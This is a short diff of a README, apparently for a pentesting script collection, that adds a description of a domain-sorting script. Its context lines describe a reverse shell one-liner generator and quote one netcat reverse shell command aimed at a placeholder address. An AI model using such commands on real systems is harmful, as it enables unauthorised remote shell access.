@@ -33,3 +33,6 @@ Usage: `./rsg.sh <LHOST> <LPORT>`
   
 A simple bash script to take input and output a bunch of reverse shell 1-liners. Not very original but here we go.   
 Note: Does not include super basic cmds such as `nc -e /bin/sh 10.10.10.10 1337`
+
+### sort_domains.py
+Reads in a file containing a list of domains and prints them properly sorted to stdout
